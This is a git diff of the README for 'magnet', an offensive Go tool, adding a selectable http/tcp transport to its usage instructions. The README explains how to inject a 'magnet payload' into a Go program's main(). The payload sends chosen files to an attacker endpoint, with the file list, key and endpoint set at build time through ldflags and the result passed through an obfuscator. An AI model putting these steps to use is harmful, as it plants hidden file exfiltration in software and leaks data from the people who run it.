@@ -31,6 +31,7 @@ export KEY=[YOUR_KEY]
 export FILES=[FILENAME]
 export ENDPOINT=[ATTACKER_ENDPOINT]
 export TARGET_OS=[TARGET_OS]
+export METHOD=[http/tcp]
 ```
 
 ### 🥷 Inject `magnet` in your Go program
@@ -39,15 +40,16 @@ export TARGET_OS=[TARGET_OS]
 ```golang
 import "github.com/ariary/magnet/pkg/magnet"
 
-var FileList,Key,Endpoint string
+var FileList,Key,Endpoint,Method string
 ```
 
 2. Add magnet payload in the `main()`:
 ```golang
-magnet.Magnet(FileList, Endpoint, Key, false)
+	sender := magnet.InitMagnetSender(Method)
+	magnet.Magnet(sender, FileList, Endpoint, Key, debug)
 ```
 
-3. Finally, modify the build command by adding `-ldflags "-X 'main.FileList=$FILES' -X 'main.Key=$KEY' -X 'main.Endpoint=$ENDPOINT'"`
+3. Finally, modify the build command by adding `-ldflags "-X 'main.FileList=$FILES' -X 'main.Key=$KEY' -X 'main.Endpoint=$ENDPOINT' -X 'main.Method=$METHOD'"`
 
 see [declare `magnet`environment variables](#declare-magnet-envar)
 
@@ -58,7 +60,7 @@ see [declare `magnet`environment variables](#declare-magnet-envar)
 To build `magnet` binary in one step:
 ```shell
 # ensure lobfuscator is in your PATH
-./build.sh $TARGET_OS $FILES $ENDPOINT $KEY
+./build.sh $TARGET_OS $FILES $ENDPOINT $KEY $METHOD
 ```
 
 See [`lobfuscator`](#build-lobfuscator) and [full example](https://github.com/ariary/magnet/blob/main/examples/EXAMPLES.md)
